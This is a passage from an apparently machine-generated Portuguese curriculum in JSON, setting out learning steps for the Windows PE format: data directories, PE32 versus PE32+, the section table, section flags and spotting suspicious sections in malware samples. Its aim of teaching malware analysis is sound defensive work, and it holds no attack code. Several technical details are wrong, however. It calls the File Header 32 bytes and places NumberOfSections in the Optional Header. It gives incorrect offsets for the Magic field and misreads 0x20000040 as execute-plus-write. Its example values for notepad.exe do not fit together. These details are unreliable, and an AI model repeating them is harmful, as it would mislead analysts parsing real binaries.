                                "Programação de Baixo Nível: Entender ponteiros e estruturas em C/C++ (IMAGE_DATA_DIRECTORY).",
                                "Sistemas Operacionais: Mapeamento de memória PE no Windows loader.",
                                "Análise de Malware: Identificar IAT para hooks ou imports suspeitos.",
                                "Engenharia Reversa: Uso em tools como IDA Pro ou Ghidra.",
                                "Redes/Forense Digital: Extrair recursos ou certificados de malwares."
                              ],
                              "realWorldApplication": "Em análise de segurança cibernética, examinar Data Directories de um binário suspeito revela capacidades: Import Table mostra APIs usadas (ex. network calls), Export Table indica se é DLL maliciosa, Resource Table esconde ícones/payloads, essencial para detecção de trojans em incident response."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.5.4.3.1"
                            ]
                          },
                          {
                            "id": "10.1.5.4.3.3",
                            "name": "Diferenciar PE32 e PE32+",
                            "description": "Comparar estruturas para 32-bit (Magic 0x10B) e 64-bit (Magic 0x20B), focando em diferenças como ImageBase de 64 bits.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a Estrutura Geral do Optional Header no Formato PE",
                                  "subSteps": [
                                    "Localize o Optional Header no cabeçalho PE usando ferramentas como CFF Explorer ou pefile em Python.",
                                    "Identifique os campos iniciais: Magic, MajorLinkerVersion, MinorLinkerVersion.",
                                    "Note que o Optional Header segue o DOS Header e o NT Headers.",
                                    "Registre o tamanho do Optional Header via SizeOfOptionalHeader no File Header.",
                                    "Visualize a estrutura em um editor hexadecimal para familiarizar com offsets."
                                  ],
                                  "verification": "Confirme que você pode apontar o offset exato do Optional Header em um arquivo PE de amostra.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Ferramenta CFF Explorer ou pefile Python",
                                    "Amostra de executável PE32 e PE32+"
                                  ],
                                  "tips": "Sempre comece pelo DOS Header 'MZ' para navegar corretamente ao PE Header.",
                                  "learningObjective": "Entender a posição e composição básica do Optional Header.",
                                  "commonMistakes": [
                                    "Confundir com Data Directory",
                                    "Ignorar o ponteiro e_lfanew no DOS Header"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar o Magic Number para Distinguir PE32 e PE32+",
                                  "subSteps": [
                                    "Abra um executável PE32 e localize o Magic no offset 0x3C + 0x18 (após NT Headers).",
                                    "Verifique se o valor é 0x10B (PE32) e anote em um executável PE32+ como 0x20B.",
                                    "Use hex editor ou script Python para extrair: magic = struct.unpack('H', f.read(2))[0] no offset correto.",
                                    "Crie uma tabela comparativa: PE32 (0x10B, 32-bit) vs PE32+ (0x20B, 64-bit).",
                                    "Teste em múltiplos arquivos para confirmar consistência."
                                  ],
                                  "verification": "Extraia e compare Magic de pelo menos 3 arquivos PE32 e 3 PE32+, documentando resultados.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Hex editor como HxD",
                                    "Biblioteca pefile Python",
                                    "Amostras: notepad.exe (PE32), explorer.exe (PE32+)"
                                  ],
                                  "tips": "Magic está nos primeiros 2 bytes do Optional Header; converta hex para decimal se necessário.",
                                  "learningObjective": "Dominar a identificação primária via Magic Number.",
                                  "commonMistakes": [
                                    "Ler offset errado (confundir com File Header)",
                                    "Misturar PE32+ com PE32 por similaridade visual"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Comparar Campos Diferenciados: ImageBase, Tamanhos e Endereços",
                                  "subSteps": [
                                    "Em PE32: ImageBase é 32-bit (offset 0x34, ex: 0x400000); em PE32+: 64-bit (offset 0x30, ex: 0x0000000140000000).",
                                    "Compare SizeOfImage: ambos 32-bit no PE32, mas PE32+ tem campos maiores como SizeOfStackReserve (64-bit).",
                                    "Analise NumberOfRvaAndSizes (deve ser 16 em ambos, mas interprete Data Directories diferentemente).",
                                    "Liste diferenças chave: AddressOfEntryPoint (32 vs 64-bit offsets), Subsystem.",
                                    "Use ferramenta para parse e exporte tabelas de comparação."
                                  ],
                                  "verification": "Crie uma tabela markdown comparando ImageBase e 3 outros campos em PE32 vs PE32+ de amostras reais.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "CFF Explorer",
                                    "PE-bear",
                                    "Scripts Python com pefile para dump de headers"
                                  ],
                                  "tips": "PE32+ tem Optional Header maior (~240 bytes vs 224 em PE32); ajuste offsets accordingly.",
                                  "learningObjective": "Mapear e contrastar campos estruturais chave entre variantes.",
                                  "commonMistakes": [
                                    "Assumir ImageBase sempre 32-bit",
                                    "Ignorar alinhamento RVA em 64-bit"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar Análise Completa e Verificação de Diferenças",
                                  "subSteps": [
                                    "Carregue um binário desconhecido e use Magic para classificar como PE32/PE32+.",
                                    "Extraia e valide ImageBase, confirmando tipo (32-bit uint vs 64-bit).",
                                    "Compare com um binário conhecido do outro tipo, destacando discrepâncias.",
                                    "Simule em script: if magic == 0x10B: print('PE32') else: print('PE32+').",
                                    "Documente achados em relatório curto com screenshots."
                                  ],
                                  "verification": "Analise 2 binários mistos e classifique corretamente com justificativa baseada em Magic e ImageBase.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Amostras mistas PE32/PE32+",
                                    "Python com struct/pefile",
                                    "Relatório template"
                                  ],
                                  "tips": "Teste em WOW64 para edge cases, mas foque em nativos.",
                                  "learningObjective": "Aplicar diferenciação em cenários reais de análise.",
                                  "commonMistakes": [
                                    "Confundir PE32+ em modo 32-bit compatível",
                                    "Não validar múltiplos campos além de Magic"
                                  ]
                                }
                              ],
                              "practicalExample": "Usando CFF Explorer em notepad.exe (PE32: Magic 0x10B, ImageBase 0x400000) vs explorer.exe (PE32+: Magic 0x20B, ImageBase 0x0000000140000000), compare offsets e valores para confirmar diferenças em ImageBase e tamanhos de pilha.",
                              "finalVerifications": [
                                "Identificar Magic corretamente em 5/5 amostras aleatórias.",
                                "Explicar por que ImageBase é 64-bit em PE32+.",
                                "Listar 3 campos com tamanhos diferentes entre PE32 e PE32+.",
                                "Parsear headers via script sem erros.",
                                "Diferenciar visualmente em hex dump."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação via Magic (100%).",
                                "Compreensão de offsets e tamanhos de campos (offsets corretos).",
                                "Tabela comparativa completa e precisa.",
                                "Aplicação prática em binários reais sem falhas.",
                                "Explicação clara de implicações (ex: endereçamento 64-bit)."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Assembly: Entender ponteiros e tamanhos de dados 32/64-bit.",
                                "Sistemas Operacionais: Mecanismos de carregamento de executáveis no Windows.",
                                "Segurança da Informação: Análise de malware em binários PE.",
                                "Engenharia Reversa: Ferramentas como IDA Pro para PE variants."
                              ],
                              "realWorldApplication": "Em análise de malware, distinguir PE32 de PE32+ permite identificar payloads 64-bit em ataques avançados, ajustando ferramentas de debugging (ex: x64dbg vs x32dbg) e entendendo bypasses de ASLR em ImageBase."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.5.4.3.1"
                            ]
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.5.5",
                    "name": "Tabelas de Seções e Diretórios no PE",
                    "description": "Análise da section table, data directories e seu uso em engenharia reversa de binários PE.",
                    "individualConcepts": [
                      {
                        "id": "10.1.5.5.1",
                        "name": "Tabela de Seções (Section Table) no Formato PE",
                        "description": "A Tabela de Seções é uma estrutura crítica no cabeçalho opcional do PE que descreve as seções do executável, incluindo suas propriedades como tamanho virtual, tamanho em disco, permissões e offsets. Cada entrada possui 40 bytes com campos como Name, VirtualSize, VirtualAddress, SizeOfRawData, PointerToRawData, Characteristics.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.5.1.1",
                            "name": "Localizar e ler a Tabela de Seções em um binário PE",
                            "description": "Usando ferramentas como CFF Explorer ou hex editor, identificar o offset da tabela a partir do NumberOfSections no Optional Header, calcular o endereço base e parsear as entradas sequenciais de 40 bytes para listar todas as seções.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente e abrir o binário PE",
                                  "subSteps": [
                                    "Baixe e instale o CFF Explorer ou abra um hex editor como HxD.",
                                    "Obtenha um binário PE de exemplo, como notepad.exe do Windows.",
                                    "Abra o arquivo no CFF Explorer ou carregue no hex editor.",
                                    "Verifique a assinatura MZ no DOS Header (primeiros 2 bytes: 4D 5A).",
                                    "Localize o offset para NT Headers no e_lfanew (offset 0x3C, geralmente 0x80 ou 0xF0)."
                                  ],
                                  "verification": "O arquivo está aberto e a assinatura MZ é visível; e_lfanew aponta para 'PE\\0\\0'.",
                                  "estimatedTime": "10-15 minutes",
                                  "materials": [
                                    "CFF Explorer",
                                    "HxD ou similar hex editor",
                                    "Binário PE exemplo (ex: notepad.exe)"
                                  ],
                                  "tips": "Use CFF Explorer para visualização amigável; hex editor para controle manual.",
                                  "learningObjective": "Configurar ferramentas e validar estrutura inicial de um PE válido.",
                                  "commonMistakes": [
                                    "Abrir arquivo não-PE (sem MZ)",
                                    "Ignorar endianness little-endian",
                                    "Confundir DOS com NT Headers"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Navegar para o Optional Header e identificar NumberOfSections",
                                  "subSteps": [
                                    "Vá para o offset e_lfanew + 24 (após Signature e File Header).",
                                    "No Optional Header, localize NumberOfSections no offset 0x06 (little-endian uint16).",
                                    "Anote o valor (ex: 0x05 para 5 seções).",
                                    "Confirme o Magic (0x010B para PE32) no início do Optional Header.",
                                    "Use CFF Explorer para ver parsed ou hex para raw bytes."
                                  ],
                                  "verification": "NumberOfSections lido corretamente e Magic validado.",
                                  "estimatedTime": "10 minutes",
                                  "materials": [
                                    "CFF Explorer",
                                    "Binário PE aberto"
                                  ],
                                  "tips": "NumberOfSections está em bytes 6-7 do Optional Header; converta hex para decimal.",
                                  "learningObjective": "Localizar e extrair campo crítico do Optional Header.",
                                  "commonMistakes": [
                                    "Ler offset errado (confundir com SizeOfOptionalHeader)",
                                    "Não converter little-endian",
                                    "Ignorar PE32 vs PE32+"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Calcular o offset base da Tabela de Seções",
                                  "subSteps": [
                                    "Calcule tamanho File Header: sempre 20h (32 bytes) + 4 para Signature = 24h antes Optional.",
                                    "Tamanho Optional Header: campo SizeOfOptionalHeader (offset 0x14 no File Header, ex: 0xE0).",
                                    "Offset Section Table = DOS Stub end + e_lfanew + 0x18 + SizeOfOptionalHeader.",
                                    "Ou: NT Headers start + FileHeader(20) + OptionalHeader size.",
                                    "Anote o offset calculado (ex: 0x400 para notepad.exe)."
                                  ],
                                  "verification": "Offset calculado bate com localização no CFF Explorer 'Section Headers'.",
                                  "estimatedTime": "15 minutes",
                                  "materials": [
                                    "Calculadora hex",
                                    "CFF Explorer para validação"
                                  ],
                                  "tips": "Fórmula padrão: NT + 24 (sig+file) + SizeOfOptionalHeader.",
                                  "learningObjective": "Dominar cálculo preciso do offset da Section Table.",
                                  "commonMistakes": [
                                    "Esquecer Signature 4 bytes",
                                    "Usar RVA em vez de offset raw",
                                    "Erro em SizeOfOptionalHeader"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Ler as entradas da Tabela de Seções",
                                  "subSteps": [
                                    "Vá para o offset calculado; cada seção = 40 bytes (28h).",
                                    "Para cada uma das NumberOfSections: leia Name (8 bytes ASCII), VirtualSize (4), VirtualAddress (4), etc.",
                                    "Parse campos chave: SizeOfRawData (8h offset), PointerToRawData (0Ch), Characteristics (24h).",
                                    "Liste: .text, .rdata, .data, .pdata, .rsrc para exemplo típico.",
                                    "Use CFF Explorer para ver nomes parsed ou hex para manual."
                                  ],
                                  "verification": "Todas seções listadas com nomes, tamanhos e offsets corretos.",
                                  "estimatedTime": "20 minutes",
                                  "materials": [
                                    "CFF Explorer",
                                    "Referência PE spec (Microsoft docs)"
                                  ],
                                  "tips": "Names são padded com NULL; Characteristics em hex (ex: 60000020 para code).",
                                  "learningObjective": "Interpretar estrutura de 40 bytes por seção.",
                                  "commonMistakes": [
                                    "Ler além do arquivo",
                                    "Confundir Virtual com Raw offsets",
                                    "Ignorar padding em names"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Validar e listar completa Tabela de Seções",
                                  "subSteps": [
                                    "Compile lista: Seção | VirtualSize | RawSize | RawOffset | RVA | Flags.",
                                    "Verifique soma RawSize + alinhamentos cobre o arquivo.",
                                    "Compare com CFF Explorer full parse.",
                                    "Note seções executáveis (flags 0x20), writable (0x80000000), etc.",
                                    "Salve screenshot ou exporte lista."
                                  ],
                                  "verification": "Lista matches output de ferramenta; flags interpretados corretamente.",
                                  "estimatedTime": "10 minutes",
                                  "materials": [
                                    "Planilha ou notepad para lista"
                                  ],
                                  "tips": "Flags: TEXT=code/exec/read, DATA=data/read/write.",
                                  "learningObjective": "Sintetizar e validar parsing completo da tabela.",
                                  "commonMistakes": [
                                    "Tamanhos desalinhados (file alignment 0x200)",
                                    "Flags mal interpretados",
                                    "Seções zeradas ignoradas"
                                  ]
                                }
                              ],
                              "practicalExample": "Em notepad.exe (Windows 10), e_lfanew=0xF0, SizeOfOptionalHeader=0xE0, NumberOfSections=0x05. Offset Section Table=0x400. Seções: .text (RVA 0x1000, Raw 0x1000), .rdata (RVA 0x5000), .data, .pdata, .rsrc. Liste com tamanhos e flags usando CFF Explorer.",
                              "finalVerifications": [
                                "NumberOfSections extraído corretamente do Optional Header.",
                                "Offset da Section Table calculado e localizado precisamente.",
                                "Todas as 40-byte entradas parseadas com nomes, sizes, offsets e flags.",
                                "Lista de seções matches parse de CFF Explorer ou pefile Python.",
                                "Identificação correta de tipos (code, data, resource).",
                                "Validação de alinhamentos e tamanhos totais."
                              ],
                              "assessmentCriteria": [
                                "Precisão no cálculo de offsets (100% match com spec).",
                                "Parsing completo de pelo menos 3 campos por seção (name, raw offset, flags).",
                                "Interpretação correta de little-endian e estruturas.",
                                "Uso adequado de ferramentas sem erros de navegação.",
                                "Lista final organizada e sem discrepâncias.",
                                "Explicação verbal de pelo menos uma seção's purpose."
                              ],
                              "crossCurricularConnections": [
                                "Análise ELF: Similar Section Headers após Program Headers.",
                                "Programação: Escrever parser PE em Python (pefile lib) ou C.",
                                "Sistemas Operacionais: Memory layout e section alignments.",
                                "Segurança: Identificar injected code em seções anormais.",
                                "Forense Digital: Extração de strings/resources de .rsrc."
                              ],
                              "realWorldApplication": "Na análise de malware, localizar seções overlay ou injected para detectar payloads; em reverse engineering, mapear código/data para disassembly; em packing detection, verificar anomalias em NumberOfSections ou alignments."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.5.1.2",
                            "name": "Interpretar campos principais da entrada de seção",
                            "description": "Analisar campos como VirtualSize (tamanho na memória), RawSize (tamanho no arquivo), PointerToRawData (offset no arquivo), Characteristics (flags como CODE, EXECUTE, READ, WRITE) para entender o layout e permissões de cada seção como .text, .data, .rdata.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Localizar e compreender a estrutura geral da entrada de seção no PE",
                                  "subSteps": [
                                    "Abra um arquivo PE usando uma ferramenta como CFF Explorer ou PE-bear.",
                                    "Navegue até a Section Table (após o cabeçalho opcional).",
                                    "Identifique os campos fixos de cada entrada: Name (8 bytes), VirtualSize (4 bytes), VirtualAddress (4 bytes), RawSize (4 bytes), PointerToRawData (4 bytes), PointerToRelocations (4 bytes), PointerToLineNumbers (4 bytes), NumberOfRelocations (2 bytes), NumberOfLineNumbers (2 bytes), Characteristics (4 bytes).",
                                    "Anote o tamanho total de cada entrada (40 bytes).",
                                    "Liste as seções comuns: .text, .data, .rdata, .bss."
                                  ],
                                  "verification": "Confirme que você pode apontar cada campo em uma entrada de seção real e descrever seu propósito.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Ferramenta PE viewer (CFF Explorer, PE-bear)",
                                    "Exemplo de arquivo PE simples (como notepad.exe)"
                                  ],
                                  "tips": "Sempre verifique o NumberOfSections no Optional Header para saber quantas entradas ler.",
                                  "learningObjective": "Compreender a layout fixo da Section Header para navegação precisa.",
                                  "commonMistakes": [
                                    "Confundir VirtualAddress com PointerToRawData",
                                    "Ignorar alinhamentos de seção (geralmente 0x1000 bytes)"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Interpretar campos de tamanho: VirtualSize e RawSize",
                                  "subSteps": [
                                    "Localize VirtualSize: representa o tamanho da seção no espaço virtual da memória quando carregada.",
                                    "Compare com RawSize: tamanho real dos dados no arquivo (arredondado para cima para alinhamento).",
                                    "Calcule a diferença: VirtualSize >= RawSize; se maior, a seção é zero-padded na memória.",
                                    "Exemplo: Para .bss, VirtualSize > RawSize pois é inicializada com zeros na memória.",
                                    "Verifique em uma seção .data: anote valores e explique implicações para alocação de memória."
                                  ],
                                  "verification": "Explique por que VirtualSize de .rdata é tipicamente igual a RawSize e demonstre com valores hexadecimais.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "PE viewer",
                                    "Documentação PE (Microsoft Docs)",
                                    "Calculadora hex"
                                  ],
                                  "tips": "RawSize deve ser múltiplo do FileAlignment (do Optional Header).",
                                  "learningObjective": "Diferenciar tamanhos em disco vs. memória para entender padding e alocação.",
                                  "commonMistakes": [
                                    "Assumir VirtualSize sempre igual a RawSize",
                                    "Não considerar alinhamentos de seção"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar campos de localização: PointerToRawData e VirtualAddress",
                                  "subSteps": [
                                    "Encontre PointerToRawData: offset absoluto dos dados da seção no arquivo PE.",
                                    "Localize VirtualAddress (RVA): endereço relativo virtual onde a seção é mapeada na memória (base + RVA).",
                                    "Navegue no arquivo usando PointerToRawData e visualize os dados.",
                                    "Calcule o alinhamento: VirtualAddress deve ser múltiplo de SectionAlignment (0x1000 tipicamente).",
                                    "Compare com outras seções para ver a ordem sequencial aproximada."
                                  ],
                                  "verification": "Usando um hex editor, pule para PointerToRawData e confirme que corresponde ao Name da seção.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Hex editor (HxD)",
                                    "PE viewer",
                                    "Arquivo PE com múltiplas seções"
                                  ],
                                  "tips": "RVA começa após o ImageBase; use para calcular endereços absolutos.",
                                  "learningObjective": "Mapear dados do arquivo para endereços de memória durante o carregamento.",
                                  "commonMistakes": [
                                    "Confundir RVA com offset no arquivo",
                                    "Ignorar gaps de padding entre seções"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Decodificar Characteristics: flags de permissões e tipo",
                                  "subSteps": [
                                    "Localize Characteristics (DWORD no final da entrada).",
                                    "Decodifique flags principais: IMAGE_SCN_CNT_CODE (0x20 para código), IMAGE_SCN_MEM_EXECUTE (0x20000000), IMAGE_SCN_MEM_READ (0x40000000), IMAGE_SCN_MEM_WRITE (0x80000000).",
                                    "Para .text: espere CODE + EXECUTE + READ.",
                                    "Para .data: DATA + WRITE + READ.",
                                    "Para .rdata: READ apenas.",
                                    "Use uma calculadora binária para somar flags e verificar valores hex."
                                  ],
                                  "verification": "Liste flags para 3 seções diferentes e justifique permissões baseadas no tipo.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Tabela de Characteristics PE (docs.microsoft.com)",
                                    "PE viewer com decodificador de flags"
                                  ],
                                  "tips": "Flags são bitmasks; use bitwise AND para testar (ex: char & 0x20 == 0x20 para código).",
                                  "learningObjective": "Interpretar permissões de memória para análise de segurança e layout.",
                                  "commonMistakes": [
                                    "Interpretar valor decimal em vez de hex/binário",
                                    "Confundir flags de tipo com flags de memória"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Sintetizar interpretação para seções específicas",
                                  "subSteps": [
                                    "Escolha seções .text, .data, .rdata e anote todos os campos principais.",
                                    "Desenhe um diagrama: arquivo (Raw) vs. memória (Virtual) mostrando tamanhos e localizações.",
                                    "Explique implicações de segurança: .text execute/read only previne injeções.",
                                    "Compare com uma seção maliciosa (ex: .rsrc com write).",
                                    "Resuma em uma tabela: Seção | VirtualSize | RawSize | RVA | Offset | Characteristics."
                                  ],
                                  "verification": "Crie uma tabela precisa para um PE real e explique anomalias potenciais.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Papel/diagrama digital",
                                    "PE de malware sample (VirusTotal)",
                                    "Planilha"
                                  ],
                                  "tips": "Procure por seções com tamanhos desproporcionais como indício de packing.",
                                  "learningObjective": "Aplicar análise integrada para entender layout completo e detectar irregularidades.",
                                  "commonMistakes": [
                                    "Não correlacionar tamanhos com permissões",
                                    "Ignorar seções não-padrão"
                                  ]
                                }
                              ],
                              "practicalExample": "Em notepad.exe (PE 32-bit), a seção .text tem VirtualSize=0x1A00, RawSize=0x200, PointerToRawData=0x400, Characteristics=0x60000020 (CODE + EXECUTE + READ). Isso indica código de 6.5KB na memória (padded), 512 bytes no arquivo a offset 1024, executável apenas em leitura – ideal para prevenir overflows.",
                              "finalVerifications": [
                                "Pode decodificar Characteristics de qualquer entrada de seção em flags legíveis.",
                                "Calcula corretamente RVAs e offsets para navegação em hex editor.",
                                "Explica diferenças entre VirtualSize/RawSize para .bss vs. .data.",
                                "Identifica permissões padrão para .text, .data, .rdata.",
                                "Detecta anomalias como seção com WRITE + EXECUTE (potencial shellcode).",
                                "Desenha layout memória vs. arquivo preciso."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação e interpretação de cada campo (90%+ correto).",
                                "Explicações claras ligando campos ao layout PE e carregamento.",
                                "Uso correto de ferramentas para validação prática.",
                                "Detecção de implicações de segurança baseadas em valores.",
                                "Tabela/diagrama sintetizando análise de múltiplas seções.",
                                "Ausência de erros comuns como confusão RVA/offset."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Entendimento de mapeamento de arquivos para memória virtual.",
                                "Programação Assembly: Análise de código em .text e dados em .data.",
                                "Segurança de Software: Detecção de seções suspeitas em malware reverse engineering.",
                                "Estruturas de Dados: Parsing de estruturas binárias fixas (como structs em C).",
                                "Redes: Análise de binários em forensics de incidentes cibernéticos."
                              ],
                              "realWorldApplication": "Em análise de malware, interpretar essas entradas permite mapear shellcode em seções não-executáveis, detectar packers por tamanhos inconsistentes, e validar patches de segurança como DEP (Data Execution Prevention) que confia em flags de Characteristics."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.5.1.3",
                            "name": "Identificar seções comuns em binários PE maliciosos",
                            "description": "Reconhecer seções como .text (código executável), .idata (tabelas de importação), .rsrc (recursos) e seções personalizadas usadas em malware para payloads ou ofuscação, correlacionando com Characteristics.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar a Estrutura da Tabela de Seções (Section Table) no Formato PE",
                                  "subSteps": [
                                    "Localize o cabeçalho PE usando uma ferramenta como CFF Explorer ou pefile em Python.",
                                    "Identifique o número de seções no campo NumberOfSections do Optional Header.",
                                    "Navegue para o offset da Section Table após o cabeçalho NT.",
                                    "Analise os campos de cada entrada de seção: Name, VirtualSize, VirtualAddress, SizeOfRawData, PointerToRawData, Characteristics.",
                                    "Registre o layout básico da tabela para referência futura."
                                  ],
                                  "verification": "Confirme que pode mapear corretamente o offset da Section Table e listar todos os campos de pelo menos uma entrada de seção.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "CFF Explorer ou PE-bear",
                                    "Amostra PE benigna (ex: notepad.exe)",
                                    "Documentação MS PE Format"
                                  ],
                                  "tips": "Sempre verifique o Magic no DOS Header para confirmar PE válido antes de prosseguir.",
                                  "learningObjective": "Compreender a localização e campos essenciais da Section Table para análise subsequente.",
                                  "commonMistakes": [
                                    "Confundir Section Table com Data Directories",
                                    "Ignorar endianness little-endian",
                                    "Não alinhar offsets corretamente"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Seções Comuns em Binários PE Benignos",
                                  "subSteps": [
                                    "Carregue uma amostra PE legítima e liste seções como .text, .data, .rdata.",
                                    "Examine .idata para tabelas de importação (IAT).",
                                    "Analise .rsrc para recursos como ícones e manifests.",
                                    "Verifique Characteristics: IMAGE_SCN_CNT_CODE para .text (0x20), IMAGE_SCN_MEM_READ para .rdata (0x40000000).",
                                    "Compare tamanhos e alinhamentos entre VirtualSize e SizeOfRawData."
                                  ],
                                  "verification": "Crie uma tabela resumindo 5 seções comuns com seus Characteristics típicos e propósitos.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "CFF Explorer",
                                    "Amostras benignas (ex: calc.exe, explorer.exe)",
                                    "Lista de Characteristics flags (docs.microsoft.com)"
                                  ],
                                  "tips": "Use hex viewer para inspecionar conteúdo: código em .text deve ser executável, não nulos.",
                                  "learningObjective": "Reconhecer padrões de seções padrão e seus flags para baseline benigno.",
                                  "commonMistakes": [
                                    "Atribuir funções erradas (ex: confundir .data com .text)",
                                    "Ignorar seções overlay após fim do arquivo",
                                    "Não notar entropia alta em seções normais"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Reconhecer Seções Suspeitas em Binários PE Maliciosos",
                                  "subSteps": [
                                    "Carregue uma amostra maliciosa conhecida (ex: de MalwareBazaar).",
                                    "Procure seções customizadas como .upx0, .pcle, .mime ou nomes com caracteres não-ASCII.",
                                    "Identifique payloads em .rsrc (ex: sub-recursos com shellcode), ou seções com Characteristics EXECUTE+WRITE (0x20000040).",
                                    "Calcule entropia de seções para detectar ofuscação (alta entropia >7.5 indica packing).",
                                    "Correlacione com imports suspeitos ou tamanho desproporcional."
                                  ],
                                  "verification": "Anote 3 seções suspeitas em uma amostra, justificando com Characteristics e entropia.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "PEiD ou DetectItEasy para signatures",
                                    "Amostras maliciosas (VM isolada)",
                                    "Python pefile + entropia script"
                                  ],
                                  "tips": "Seções com PointerToRawData=0 podem ser virtuais; foque em RWX para injeção.",
                                  "learningObjective": "Detectar anomalias em seções que indicam payloads, packing ou ofuscação maliciosa.",
                                  "commonMistakes": [
                                    "Focar só em nomes, ignorar Characteristics",
                                    "Não validar em VM sandbox",
                                    "Confundir legitimate packers (ex: UPX) sem análise"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Correlacionar Seções com Análise Comportamental e Verificação",
                                  "subSteps": [
                                    "Extraia e disasseble .text com IDA ou Ghidra para strings maliciosas.",
                                    "Use debugger (x64dbg) para dump memória de seções RWX em runtime.",
                                    "Compare com VirusTotal ou Hybrid Analysis para confirmação.",
                                    "Documente chain: seção suspeita -> Characteristics -> possível exploit.",
                                    "Teste remoção de seção customizada e veja se binário falha."
                                  ],
                                  "verification": "Gere relatório de 1 página correlacionando seções a IOCs maliciosos.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "x64dbg ou Ghidra",
                                    "VM com sandbox (Cuckoo ou Any.Run)",
                                    "VirusTotal API"
                                  ],
                                  "tips": "Procure OEP (Original Entry Point) em packers via seções grandes.",
                                  "learningObjective": "Integrar identificação estática com dinâmica para confirmação de malícia.",
                                  "commonMistakes": [
                                    "Análise estática só, sem runtime",
                                    "Não isolar amostras",
                                    "Overlook seções zeroed como anti-análise"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário Emotet (SHA256: exemplo de MalwareBazaar), identifique .text (código ofuscado, entropia 7.9), .rsrc com payload DLL embedded, e .custom1 (RWX, usado para shellcode). Correlacione IMAGE_SCN_MEM_EXECUTE|WRITE (0x20000040) com drops de ransomware via debugger.",
                              "finalVerifications": [
                                "Lista corretamente 5 seções comuns PE com Characteristics.",
                                "Identifica pelo menos 2 anomalias em amostra maliciosa (ex: RWX, alta entropia).",
                                "Calcula entropia manualmente ou via script para uma seção.",
                                "Explica correlação entre .idata e seções custom em ofuscação.",
                                "Gera relatório com screenshots de CFF Explorer destacando suspeitas.",
                                "Diferencia packer legítimo (UPX) de custom malicioso."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de seções e flags (90%+ correto).",
                                "Profundidade na análise de entropia e correlações (inclui métricas).",
                                "Qualidade do relatório: claro, com evidências visuais.",
                                "Demonstração prática em debugger sem crashes.",
                                "Identifica 3+ IOCs únicos por amostra.",
                                "Evita falsos positivos em benignos."
                              ],
                              "crossCurricularConnections": [
                                "Análise de Assembly: Disassembly de .text para malícia.",
                                "Criptografia: Entropia e ofuscação em seções packed.",
                                "Sistemas Operacionais: Memória protections (DEP) vs RWX.",
                                "Programação: Uso de pefile Python para automação.",
                                "Redes: Correlação com C2 em recursos .rsrc."
                              ],
                              "realWorldApplication": "Reversores em equipes de threat hunting usam isso para triagem rápida de malwares em EDRs (ex: CrowdStrike), detectando packers como Themida via seções custom, prevenindo infecções em endpoints corporativos."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.5.5.2",
                        "name": "Diretórios de Dados (Data Directories) no Formato PE",
                        "description": "Os Data Directories são um array de 16 entradas no Optional Header (cada uma com RVA e Size) que apontam para estruturas importantes como Export Table, Import Table, Resource Table, TLS, etc., facilitando o acesso rápido a metadados críticos.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.5.2.1",
                            "name": "Acessar o array de Data Directories no Optional Header",
                            "description": "No Optional Header, localizar o campo DataDirectory com 16 estruturas IMAGE_DATA_DIRECTORY, interpretando índices padronizados (ex: 0=Export, 1=Import, 5=Reloc) para obter RVAs e tamanhos.",
                            "atomicExpansion": {
